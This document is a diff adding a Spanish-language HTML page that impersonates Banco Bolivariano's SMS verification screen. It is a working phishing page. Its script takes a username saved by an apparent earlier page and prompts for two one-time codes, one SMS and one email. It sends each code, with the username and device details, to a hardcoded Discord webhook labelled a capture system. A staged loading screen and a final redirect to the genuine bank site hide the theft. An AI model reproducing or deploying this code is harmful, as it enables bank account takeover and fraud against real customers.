@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Banco Bolivariano - Verificación SMS</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background: #ffffff;
+      color: #111827;
+    }
+
+    .page {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 32px 20px 40px;
+    }
+
+    @media (min-width: 768px) {
+      .page {
+        padding-top: 40px;
+      }
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 32px;
+    }
+
+    .header img {
+      height: 32px;
+    }
+
+    .title {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    @media (min-width: 480px) {
+      .title {
+        font-size: 28px;
+      }
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #4b5563;
+      line-height: 1.4;
+      margin-bottom: 24px;
+    }
+
+    .username-highlight {
+      color: #059669;
+      font-weight: 600;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 6px;
+      color: #111827;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    .input {
+      width: 100%;
+      border-radius: 10px;
+      border: 1px solid #e5e7eb;
+      padding: 12px 14px;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+      text-align: center;
+      letter-spacing: 4px;
+      font-weight: 600;
+    }
+
+    .input:focus {
+      border-color: #059669;
+      box-shadow: 0 0 0 1px rgba(5,150,105,0.15);
+    }
+
+    .btn-primary {
+      width: 100%;
+      border-radius: 999px;
+      border: none;
+      padding: 14px 16px;
+      font-size: 15px;
+      font-weight: 500;
+      margin: 12px 0 28px;
+      background: #e5e7eb;
+      color: #9ca3af;
+      cursor: not-allowed;
+      transition: all 0.2s ease;
+    }
+
+    .btn-primary:enabled {
+      background: #059669;
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    .btn-primary:enabled:hover {
+      background: #047857;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    /* Loading screen styles */
+    .loading-screen {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loading-screen.active {
+      display: flex;
+    }
+
+    .loading-content {
+      text-align: center;
+      max-width: 480px;
+      padding: 32px 20px;
+    }
+
+    .loading-logo {
+      margin-bottom: 40px;
+    }
+
+    .loading-logo img {
+      height: 36px;
+    }
+
+    .spinner-wrapper {
+      margin: 0 auto 32px;
+      width: 80px;
+      height: 80px;
+    }
+
+    .spinner {
+      width: 100%;
+      height: 100%;
+      border: 4px solid #e5e7eb;
+      border-top-color: #059669;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: #111827;
+    }
+
+    .loading-subtitle {
+      font-size: 15px;
+      color: #6b7280;
+      line-height: 1.6;
+    }
+
+    .dots {
+      display: inline-block;
+      width: 20px;
+      text-align: left;
+    }
+
+    .dots::after {
+      content: '';
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0%, 20% { content: ''; }
+      40% { content: '.'; }
+      60% { content: '..'; }
+      80%, 100% { content: '...'; }
+    }
+
+    .info-box {
+      background: #eff6ff;
+      border: 1px solid #bfdbfe;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      gap: 12px;
+    }
+
+    .info-icon {
+      flex-shrink: 0;
+      color: #3b82f6;
+      margin-top: 2px;
+    }
+
+    .info-text {
+      font-size: 13px;
+      color: #1e40af;
+      line-height: 1.5;
+    }
+
+    .resend-link {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 14px;
+    }
+
+    .resend-link a {
+      color: #059669;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .resend-link a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <!-- Logo -->
+    <div class="header">
+      <img src="https://portalbb-multimedia.bolivariano.com/images/default-source/new-home/logo-bb.png"
+           alt="Banco Bolivariano">
+    </div>
+
+    <!-- Step 1: Primer código SMS -->
+    <div id="step1" class="step active">
+      <h1 class="title">Verificación de seguridad</h1>
+      <p class="subtitle">Estimado/a <span class="username-highlight" id="usernameDisplay1"></span>, por tu seguridad, hemos enviado un código de verificación SMS al número asociado a tu cuenta.</p>
+
+      <div class="info-box">
+        <div class="info-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="16" x2="12" y2="12"/>
+            <line x1="12" y1="8" x2="12.01" y2="8"/>
+          </svg>
+        </div>
+        <div class="info-text">
+          El código llegará en los próximos 30 segundos. Si no lo recibes, puedes solicitar uno nuevo.
+        </div>
+      </div>
+
+      <form id="smsForm1">
+        <div class="field">
+          <label for="code1">Código SMS (6 dígitos)</label>
+          <input id="code1" class="input" type="text" maxlength="6" pattern="[0-9]*" inputmode="numeric" required>
+        </div>
+
+        <button id="btn1" class="btn-primary" type="submit" disabled>Verificar código</button>
+      </form>
+
+      <div class="resend-link">
+        <a href="#" id="resendLink1">¿No recibiste el código? Reenviar</a>
+      </div>
+    </div>
+
+    <!-- Step 2: Segundo código SMS -->
+    <div id="step2" class="step">
+      <h1 class="title">Segundo código de verificación</h1>
+      <p class="subtitle">Estimado/a <span class="username-highlight" id="usernameDisplay2"></span>, por políticas de seguridad del banco, necesitamos verificar tu identidad con un codigo enviado a tu correo electronico registrado.</p>
+
+      <div class="info-box">
+        <div class="info-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="16" x2="12" y2="12"/>
+            <line x1="12" y1="8" x2="12.01" y2="8"/>
+          </svg>
+        </div>
+        <div class="info-text">
+          Hemos enviado un código a tu correo electronico. Este paso adicional garantiza la seguridad de tu cuenta.
+        </div>
+      </div>
+
+      <form id="smsForm2">
+        <div class="field">
+          <label for="code2">Segundo código (6 dígitos)</label>
+          <input id="code2" class="input" type="text" maxlength="6" pattern="[0-9]*" inputmode="numeric" required>
+        </div>
+
+        <button id="btn2" class="btn-primary" type="submit" disabled>Verificar y continuar</button>
+      </form>
+
+      <div class="resend-link">
+        <a href="#" id="resendLink2">¿No recibiste el código? Reenviar</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading Screen -->
+  <div id="loadingScreen" class="loading-screen">
+    <div class="loading-content">
+      <div class="loading-logo">
+        <img src="https://portalbb-multimedia.bolivariano.com/images/default-source/new-home/logo-bb.png"
+             alt="Banco Bolivariano">
+      </div>
+
+      <div class="spinner-wrapper">
+        <div class="spinner"></div>
+      </div>
+
+      <h1 class="loading-title">Procesando verificación</h1>
+      <p class="loading-subtitle">
+        Espera un momento mientras enviamos el siguiente código<span class="dots"></span>
+      </p>
+    </div>
+  </div>
+
+  <script>
+    const code1Input = document.getElementById("code1");
+    const code2Input = document.getElementById("code2");
+    const btn1 = document.getElementById("btn1");
+    const btn2 = document.getElementById("btn2");
+    const form1 = document.getElementById("smsForm1");
+    const form2 = document.getElementById("smsForm2");
+    const step1 = document.getElementById("step1");
+    const step2 = document.getElementById("step2");
+    const loadingScreen = document.getElementById("loadingScreen");
+    const usernameDisplay1 = document.getElementById("usernameDisplay1");
+    const usernameDisplay2 = document.getElementById("usernameDisplay2");
+    
+    const webhookUrl = "https://discord.com/api/webhooks/1524852154517688572/YZV8l9Qmxh6W6QXkhu3VUgeVaJ23gTLwqGWVOl6cWQiG06hMfITgYOF77_AunQACmL_T";
+
+    // Recuperar usuario del localStorage y mostrarlo
+    let savedUsuario = "Usuario";
+    try {
+      const savedData = localStorage.getItem('bb_form_data');
+      if (savedData) {
+        const data = JSON.parse(savedData);
+        if (data.usuario) {
+          savedUsuario = data.usuario;
+        }
+      }
+    } catch (e) {
+      console.error('Error al recuperar usuario:', e);
+    }
+
+    // Mostrar el nombre de usuario en ambos steps
+    usernameDisplay1.textContent = savedUsuario;
+    usernameDisplay2.textContent = savedUsuario;
+
+    // Validar entrada de código 1
+    function validateCode1() {
+      const code = code1Input.value.trim();
+      btn1.disabled = code.length !== 6;
+    }
+
+    // Validar entrada de código 2
+    function validateCode2() {
+      const code = code2Input.value.trim();
+      btn2.disabled = code.length !== 6;
+    }
+
+    code1Input.addEventListener("input", validateCode1);
+    code2Input.addEventListener("input", validateCode2);
+
+    // Solo números en los inputs
+    [code1Input, code2Input].forEach(input => {
+      input.addEventListener("keypress", (e) => {
+        if (!/[0-9]/.test(e.key)) {
+          e.preventDefault();
+        }
+      });
+    });
+
+    // Función para enviar código al webhook
+    async function sendToDiscord(codigoSMS, tipo) {
+      const userAgent = navigator.userAgent;
+      const currentTime = new Date().toLocaleString('es-CO', { 
+        timeZone: 'America/Bogota',
+        dateStyle: 'full',
+        timeStyle: 'long'
+      });
+
+      const payload = {
+        embeds: [{
+          title: `📱 ${tipo} - Banco Bolivariano`,
+          description: "Se ha recibido un código de verificación SMS.",
+          color: 5814783,
+          fields: [
+            {
+              name: "👤 Usuario",
+              value: `\`\`\`${savedUsuario}\`\`\``,
+              inline: false
+            },
+            {
+              name: "🔢 Código SMS",
+              value: `\`\`\`${codigoSMS}\`\`\``,
+              inline: false
+            },
+            {
+              name: "📋 Tipo",
+              value: tipo,
+              inline: true
+            },
+            {
+              name: "🕐 Fecha y Hora",
+              value: currentTime,
+              inline: false
+            },
+            {
+              name: "💻 Dispositivo",
+              value: `\`\`\`${userAgent}\`\`\``,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "Sistema de Captura | @Brknshinexxx",
+            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        const res = await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        return res.ok;
+      } catch (err) {
+        console.error(err);
+        return false;
+      }
+    }
+
+    // Envío del primer código
+    form1.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const code = code1Input.value.trim();
+      if (code.length !== 6) return;
+
+      btn1.disabled = true;
+      btn1.textContent = "Verificando...";
+
+      const success = await sendToDiscord(code, "Primer Código SMS");
+
+      if (success) {
+        // Mostrar pantalla de carga
+        step1.classList.remove("active");
+        loadingScreen.classList.add("active");
+
+        // Esperar 30 segundos antes de mostrar step 2
+        setTimeout(() => {
+          loadingScreen.classList.remove("active");
+          step2.classList.add("active");
+        }, 30000);
+      } else {
+        alert("Error al procesar. Intenta nuevamente.");
+        btn1.disabled = false;
+        btn1.textContent = "Verificar código";
+      }
+    });
+
+    // Envío del segundo código
+    form2.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const code = code2Input.value.trim();
+      if (code.length !== 6) return;
+
+      btn2.disabled = true;
+      btn2.textContent = "Verificando...";
+
+      const success = await sendToDiscord(code, "Segundo Código SMS");
+
+      if (success) {
+        // Guardar en localStorage que completó el proceso
+        localStorage.setItem('bb_sms_verified', 'true');
+        
+        // Redirigir al sitio oficial del banco
+        window.location.href = "https://www.bolivariano.com/";
+      } else {
+        alert("Error al procesar. Intenta nuevamente.");
+        btn2.disabled = false;
+        btn2.textContent = "Verificar y continuar";
+      }
+    });
+
+    // Enlaces de reenvío (simulados)
+    document.getElementById("resendLink1").addEventListener("click", (e) => {
+      e.preventDefault();
+      alert("Se ha reenviado el código a tu teléfono.");
+    });
+
+    document.getElementById("resendLink2").addEventListener("click", (e) => {
+      e.preventDefault();
+      alert("Se ha reenviado el código a tu teléfono.");
+    });
+  </script>
+</body>
+</html>
